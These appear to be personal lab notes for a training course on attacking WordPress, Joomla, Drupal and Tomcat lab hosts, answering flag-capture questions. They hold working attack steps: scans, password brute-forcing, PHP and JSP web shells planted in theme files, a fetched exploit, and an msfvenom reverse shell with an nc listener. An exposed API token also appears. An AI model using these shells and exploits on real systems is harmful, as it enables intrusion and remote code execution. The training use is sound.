# Application Discovery & Enumeration

```bash

sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

sudo nmap --open -sV 10.129.201.50

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness


```


# WordPress - Discovery & Enumeration

```bash

gobuster dir -u http://blog.inlanefreight.local/wp-content/  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

wget http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt


sudo wpscan --url http://blog.inlanefreight.local --enumerate

curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt

```


# Attacking WordPress

Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present? 

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate u  --api-token paYKDK1ev8wFy9mX5A5ppyHVkoM9WjPpIMPzItVjTFM

```

Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer. 

```bash
# login and go to http://blog.inlanefreight.local/wp-admin/theme-editor.php

sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /home/avataris12/CTF/CTF_2023/desconstru_ctf/Forensics/Hash_Roll/rockyou.txt --url http://blog.inlanefreight.local --api-token paYKDK1ev8wFy9mX5A5ppyHVkoM9WjPpIMPzItVjTFM

python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Using the methods shown in this section, find another system user whose login shell is set to /bin/bash. 

```bash
# login and go to http://blog.inlanefreight.local/wp-admin/theme-editor.php
# go to http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

system($_GET[0]); # update the the file

curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id


```

Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

```bash

wget https://www.exploit-db.com/raw/49967

python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

curl -s http://blog.inlanefreight.local/wp-content/uploads/2024/06/lmjbsqrttfpevvk-1719495517.7316.php?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt

```

# Joomla - Discovery & Enumeration

Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x) 

```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://app.inlanefreight.local/


git clone https://github.com/drego85/JoomlaScan.git
python2.7 joomlascan.py -u http://app.inlanefreight.local

curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

```

Find the password for the admin user on http://app.inlanefreight.local 


```bash
git clone https://github.com/ajnik/joomla-bruteforce.git

sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin


```

# Attacking Joomla

Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

```bash

#login user:password admin:admin

#go to files http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506

system($_GET['cmd']); # add this to error.php 

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=ls%20/var/www/dev.inlanefreight.local

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=cat%20/var/www/dev.inlanefreight.local/flag_6470e394cab6a91682cc8585059b.txt

```

# Drupal - Discovery & Enumeration

Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local 

```bash

curl -s drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

droopescan scan drupal -u http://drupal.inlanefreight.local


```

# Attacking Drupal

Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. 

```bash
# http://drupal-qa.inlanefreight.local/node/4
# text format php code
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

curl -s http://drupal-qa.inlanefreight.local/node/4?cmd=cat%20/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt


```

# Tomcat - Discovery & Enumeration

What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180? 

```bash
curl -s http://web01.inlanefreight.local:8180/docs/ | grep Tomcat
```
# Attacking Tomcat

Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? 
What is the password?

```bash

use scanner/http/tomcat_mgr_login


```


Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp 

# go to war file to deploy browser the file

curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

nc -lnvp 4443

```
